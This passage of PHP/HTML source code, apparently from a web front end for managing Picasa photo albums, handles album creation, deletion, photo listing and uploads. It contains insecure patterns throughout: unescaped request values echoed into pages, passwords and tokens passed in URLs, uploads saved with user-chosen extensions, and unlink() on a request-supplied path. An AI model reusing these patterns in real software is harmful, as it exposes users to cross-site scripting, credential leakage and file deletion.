                        字数：<input <?php  $style->textarea("#FCFC9D","");?> style="width:8%;height:22px;" type="text" id="count" name="count" onKeyUp="value=value.replace(/[^(0-9|\;),]/g,'')" value="0" readOnly />
                </td>
        </tr>   
        <tr>
                <td align="center" height="40">
                        验证码：
                </td>
                <td align="center">
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:76%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9A-Za-z,]/g,'')" value="" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="15" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%">
                <?php 
                if (trim(request("albumid")) == ""){
                ?>
                        <input id=bsubmit value="OK ，添加相册！" type="submit" />
                <?php 
                }
                else{
                ?>
                        <input id=bsubmit value="OK ，更新相册！" type="submit" /> <input id=vsubmit value="高级更新相册！" type="button" onclick="vbscript:updatealbum('<?php echo trim(request("albumid"))?>')" />
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
                <?php 
                break;  // action - album.edit end
        case "album.create": // action - album.create start
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        break;
                                    }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }

                if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action=");
                        break;
                }       
                elseIF (trim($_POST["albumtitle"]) != "" || trim($_POST["albumsummary"]) != "" || trim($_POST["albumlocation"]) != "" || trim($_POST["albumkeywords"]) != "" || trim($_POST["albumcommentingEnabled"]) != "" || trim($_POST["albumaccess"]) != ""){
                        redirect(httppath()."?".$_SERVER['QUERY_STRING']."&albumtitle=".trim($_POST["albumtitle"])."&albumsummary=".trim(request("albumsummary"))."&albumlocation=".trim(request("albumlocation"))."&albumkeywords=".trim(request("albumkeywords"))."&albumcommentingEnabled=".trim(request("albumcommentingEnabled"))."&albumaccess=".trim(request("albumaccess"))."&checkcode=".trim(request("checkcode")));
                        break;
                }
                $google_album = new google_class();
                $albumcreate = $google_album->googlealbumcreate(trim(request("authclientLogin")),trim(request("albumid")),trim(request("albumtitle")),trim(request("albumsummary")),trim(request("albumlocation")),trim(request("albumaccess")),trim(request("albumcommentingEnabled")),trim(request("albumkeywords")));
                //print_r($albumcreate);
                //echo $albumcreate['xmlstr'];
                //echo trim(request("refer"));
                //return;
                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           
                <?php 
                if (stripos($albumcreate['xmlstr'] ,"<") === false && $albumcreate['xmlcode'] != '201'){
                        echo $albumcreate['xmlstr'].$albumcreate['xmlcode'];
                ?>
        <tr class="tdbg">
                <td align="center" id="result">
                        <?php 
                        if (trim(request("albumid")) == ""){
                        ?>
                        相册添加失败！原因：<?php echo $albumcreate['']." <br>".($timeout/1000)?> 秒后返回上一页
                        <?php 
                        }       
                        elseif (trim(request("albumid")) != ""){
                ?>
                        相册更新失败！原因：<?php echo $xmlstr." <br>".($timeout/1000)?> 秒后返回上一页
                        <?php 
                        }       
                        ?>
                </td>
        </tr>   
                <?php       
                        echo "<p align=center><script>window.setTimeout(\"history.go(-3)\",".$timeout.");</script></p>";                                
                        break;
                }
                elseif ($albumcreate['xmlcode'] == '201'){
                }
                if ($albumcreate['gphotoid'] != ''){
                ?>

        <tr class="tdbg">
                <td align="center" id="result">
                        <?php 
                        if (trim(request("albumid")) == ""){
                        ?>
                        相册添加成功！相册ID：<?php echo $albumcreate['gphotoid']." <br>".($timeout/1000)?> 秒后返回上一页
                        <?php 
                        }       
                        elseif (trim(request("albumid")) != ""){
                ?>
                        相册更新成功！相册ID：<?php echo $albumcreate['gphotoid']." <br>".($timeout/1000)?> 秒后返回上一页
                        <?php 
                        }       
                        ?>
                </td>
        </tr>   
                        <?php       
                        echo "<p align=center><script>window.setTimeout(\"history.go(-3)\",".$timeout.");</script></p>";                                
                
                }       
                else{
                ?>
        <tr class="tdbg">
                <td align="center" id="result">
                        <?php 
                        if (trim(request("albumid")) == ""){
                        ?>
                        相册添加失败！原因：<?php echo $albumcreate['xmlstr']." <br>".($timeout/1000)?> 秒后返回上一页
                        <?php 
                        }       
                        elseif (trim(request("albumid")) != ""){
                ?>
                        相册更新失败！原因：<?php echo $albumcreate['xmlstr']." <br>".($timeout/1000)?> 秒后返回上一页
                        <?php 
                        }       
                        ?>
                </td>
        </tr>   
                <?php       
                        echo "<p align=center><script>window.setTimeout(\"history.go(-3)\",".$timeout.");</script></p>";                                
                
                }
                ?>
</table>                        
                <?php               
                break;
        case "album.remove": // action - album.remove start
                if (trim(request("delok")) == "1"){
                        if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                                redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action=");
                                break;
                        }                       
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>
        <script language="javascript">
                if(confirm('确定删除选中的<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>?') == true){
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";
                }       
                else{   
                        alert("该<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除取消！");
                        history.go(-1);
                }       
        </script>
                <?php 
                        break;
                     }
                }
                $google_album = new google_class();
                $albumremove = $google_album->googlealbumremove(trim(request("authclientLogin")),trim(request("albumid")),$page,$pagesize,$_POST);
                
                $xmlcode = $albumremove['xmlcode'];
                $xmlstr = $albumremove['xmlstr'];
                
                $timeout = "5000";
                if ($xmlstr == "" && $xmlcode == "200"){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                相册删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                        
                ?>
</table>                        
                <?php 
                }
                elseif ($xmlstr != "" && $xmlstr != "wait"){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                相册删除失败！原因： <?php echo $xmlstr;?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                ?>
</table>                        
                <?php       
                }
                elseif ($xmlstr != "" && $xmlstr == "wait"){
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                相册删除失败！原因：“未选择任何条目！”<?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                ?>
</table>                        
                <?php       
                }
                break; // action - album.remove end
        case "photo.list": // action - photo.list start
                if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                $google_album = new google_class();
                $photolist = $google_album->googlephotolist(trim(request("authclientLogin")),trim(request("albumid")),$page,$pagesize);
                //print_r($photolist);
                //return;
                if ($photolist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $photolist['length'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.picasa.chidd'+i))
 {
  eval('document.picasa.chidd'+i).checked = document.picasa.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.picasa.action='<?php echo ScriptPath()."?api=picasa&action=".encodeuri("photo.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&albumid=".encodeuri(trim(request("albumid")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.picasa.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $photolist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>相册</a> - <?php echo $photolist['username'];?> - <?php echo $photolist['albumname'];?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="picasa" method="post" action="">
                <?php 
                $totalitem = $photolist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=15%>
                        名称
                </td>
                <td align="center" width=15%>
                        图片
                </td>
                <td align="center" width=15%>
                        状态
                </td>
                <td align="center" width=15%>
                        回复
                </td>
                <td align="center" width=30%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("photo.upload");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo urlencode(trim(request("pwd")));?>&albumid=<?php echo encodeuri(trim(request("albumid")))?>&albumname=<?php echo encodeuri(trim(request("albumname")));?>">上传</a> <a style="color:#000000" href="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("photo.post");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo urlencode(trim(request("pwd")));?>&albumid=<?php echo encodeuri(trim(request("albumid")))?>&albumname=<?php echo encodeuri(trim(request("albumname")));?>">收藏</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a>
                </td> 
        </tr>   
                <?php 
                //print_r($photolist);
                //return;
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        //$objHdd = $objList->item($i);
                        //print_r($photolist['$i']);
                        //exit;
                        //echo $photolist['0']['photoid'];
                        //echo $i;
                        //echo $photolist[$i]['photoid'];
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $photoid = $photolist[$i]['photoid'];
                        $photoname = $photolist[$i]['photoname'];
                        $photopublished = $photolist[$i]['photopublished'];
                        $photoupdated = $photolist[$i]['photoupdated'];
                        $photosummary = $photolist[$i]['photosummary'];
                        $photosize = $photolist[$i]['photosize'];
                        $photoaccess = $photolist[$i]['photoaccess'];
                        $photolocation = $photolist[$i]['photolocation'];
                        $photocommentcount = $photolist[$i]['photocommentcount'];
                        $photolink = $photolist[$i]['photolink'];
                        echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=picasa&action=".encodeuri("photo.view")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&albumid=".encodeuri(trim(request("albumid")))."&photoid=".encodeuri($photoid)."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."\">".$photoname."</a>";
                ?>
                </td>
                <td align="center">
                        <?php 
                        echo $photosize."(B)";
                        ?>
                </td>
                <td align="center">
                        <?php echo $photoaccess?>
                </td>
                <td align="center">
                        <?php echo $photocommentcount;?>
                </td>
                <td align="center">
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("photo.edit")."&authclientlogin=".encodeuri(trim(request("authclientlogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&photoid=".encodeuri($photoid)."&albumid=".encodeuri(trim(request("albumid")));?>">编辑</a> <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("photo.remove")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&photoid=".encodeuri($photoid)."&albumid=".encodeuri(trim(request("albumid")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">删除</a> <?php  if (commentingenabled == "ture") { ?>回复<?php }else{?><?php }?> 
                </td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>
</table><table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=picasa&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&albumid=".trim(request("albumid"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=picasa&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&albumid=".trim(request("albumid"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."'>下一页</a> ";

                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=picasa&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&albumid=".trim(request("albumid"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "photo.view": // action - photo.view start
                $google_album = new google_class();
                $photoview = $google_album->googlephotoview(trim(request("authclientLogin")),trim(request("albumid")),$page,$pagesize);
                if ($photoview['photoname'] == ""){
                		if(!is_wap()){
                        AlertBack("图片已不存在，请重试！" , 1);
                    }
                    else{
                    ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											图片已不存在，请重试！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
										<?php 
                    }    
                    break;
                }
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"));?>" target=_self>相册</a> -  <?php echo $photoview['username'];?> - <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("photo.list")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&albumid=".trim(request("albumid"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&photoid=".trim(request("photoid"));?>"><?php echo $photoview['albumname'];?></a> - <?php echo $photoview['photoname'];?> ]
        </tr>
</table>
<table width="95%" height="74.5%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" valign="center" colspan="3" width="100%" height="100%">
                        <a style="color:#000000;" href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>"/><img id="picasa" src="<?php echo $photoview['photourl'];?>" border="0" width="<?php echo $photoview['photowidth'];?>" height="<?php echo $photoview['photoheight'];?>" />
                </td>
        </tr>
</table>
<script language="javascript">
<!--
        if ("<?php echo $photoview['photowidth'];?>" > window.screen.availWidth * 0.77){
                document.getElementById("picasa").width = window.screen.availWidth * 0.77;
        }
        if ("<?php echo $photoview['photoheight'];?>" > window.screen.availHeight * 0.70){
                document.getElementById("picasa").height = window.screen.availHeight * 0.70;
        }
//-->
</script>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="left" colspan="3" width="100%">
                &nbsp;&nbsp;操作：删除 更新 修改
                </td>
        </tr>
</table>        
                <?php       
                break; // action - photo.view end
        case "photo.post": // action - photo.post start
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>相册</a> - <?php echo arrmember(split('[@]',base64_decode(trim(request("uname")))),0);?> - <?php echo trim(request("albumname"));?> ] </td>
        </tr>
</table>
<table width="95%" height="40" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                if (trim(request("photoid")) == ""){
                ?>
                        <form action="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("photo.create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&albumid=<?php echo trim(request("albumid"));?>" method="post" name="google">
                <?php 
                }
                else{
                ?>
                        <form action="<?php echo ScriptPath();?>?api=picasa&photoid=<?php echo encodeuri(trim(request("photoid")));?>&action=<?php echo encodeuri("photo.update");?>&pagesize=<?php echo encodeuri(pagesize)."&page=".encodeuri("1")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&albumid=<?php echo trim(request("albumid"));?>" method="post" name="google">
                <?php 
                }
                ?>
        <tr>
                <td align="center" width="60%" height="20">
                        相片路径：
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:60%;height:22px;" type="text"  id="photopath" name="photopath" value="<?php echo trim(request("photopath"));?>" />
                </td>
                <td align="center" width="40%">
                        验证码：

                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:46%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9a-zA-Z,]/g,'')" value="" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="15" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%">
                <?php 
                if (trim(request("photoid")) == ""){
                ?>
                        <input id=bsubmit value="OK ，添加图片！" type="submit" />
                <?php 
                }
                else{
                ?>
                        <input id=bsubmit value="OK ，更新图片！" type="submit" />
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
                <?php 
                break; // action - photo.post end
        case "photo.upload": // action - photo.post start
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>相册</a> - <?php echo arrmember(split('[@]',base64_decode(trim(request("uname")))),0);?> - <?php echo trim(request("albumname"));?> ] </td>
        </tr>
</table>
<table width="95%" height="40" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                if (trim(request("photoid")) == ""){
                ?>
                        <form enctype="multipart/form-data" action="<?php echo ScriptPath();?>?api=picasa&action=<?php echo encodeuri("photo.create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&albumid=<?php echo trim(request("albumid"));?>" method="post" name="google">
                <?php 
                }
                else{
                ?>
                        <form enctype="multipart/form-data" action="<?php echo ScriptPath();?>?api=picasa&photoid=<?php echo encodeuri(trim(request("photoid")));?>&action=<?php echo encodeuri("photo.update");?>&pagesize=<?php echo encodeuri(pagesize)."&page=".encodeuri("1")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&albumid=<?php echo trim(request("albumid"));?>" method="post" name="google">
                <?php 
                }
                ?>
        <tr>
                <td align="center" width="60%" height="20">
                        相片路径：
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:60%;height:22px;" type="file" name="photopath" id="photopath" value="<?php echo trim(request("photopath"));?>" />
                </td>
                <td align="center" width="40%">
                        验证码：

                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:46%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9a-zA-Z,]/g,'')" value="" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="15" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%">
                <?php 
                if (trim(request("photoid")) == ""){
                ?>
                        <input id=bsubmit value="上传图片！" type="submit" /> <input id=vsubmit value="上传大图片！" type="button" onclick="vbscript:uploadfile(document.google.photopath.value)" />
                <?php 
                }
                else{
                ?>
                        <input id=bsubmit value="OK ，更新图片！" type="submit" />
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
                <?php 
                break; // action - photo.post end
        case "photo.create" : // action - photo.create end

                if (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (is_uploaded_file($_FILES['photopath']['tmp_name']) && trim($_GET["photopath"]) == "" ){
                        //$filename = basename($_FILES['photopath']['name'])."_".time().'.'.geturlinfo(httppathdir()."/tmp/".basename($_FILES['photopath']['name']),"ext");
                        $filename = time().'.'.geturlinfo(httppathdir()."/tmp/".basename($_FILES['photopath']['name']),"ext");
                        copy($_FILES['photopath']['tmp_name'], "./tmp/".$filename);
                        redirect(httppath()."?".$_SERVER['QUERY_STRING']."&photopath=".encodeuri("/tmp/".$filename));
                        break;
                }

                //echo trim(request("photopath"));      

                $google_album = new google_class();
                $photocreate = $google_album->googlephotocreate(trim(request("authclientLogin")),trim(request("albumid")),httppathdir().trim(request("photopath")));
                unlink(trim(request("photopath")));
                //print_r($photocreate);
                //return;

                //echo $_GET["refer"];
                //return;       

